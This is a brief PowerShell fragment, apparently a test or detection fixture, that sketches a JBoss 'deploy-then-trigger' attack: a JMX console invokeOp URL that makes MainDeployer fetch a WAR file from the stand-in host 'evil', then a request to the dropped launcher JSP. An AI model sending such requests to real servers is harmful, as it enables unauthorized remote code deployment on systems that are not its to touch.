# JBoss deploy-then-trigger shape: JMX invokeOp deployment plus a dropped
# JSP request.
$deploy = '/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service=MainDeployer&methodIndex=19&arg0=http://evil/launcher.war'
$req = New-Object System.Net.WebClient
$req.Method = 'HEAD'
$hit = '/launcher/launcher.jsp?'
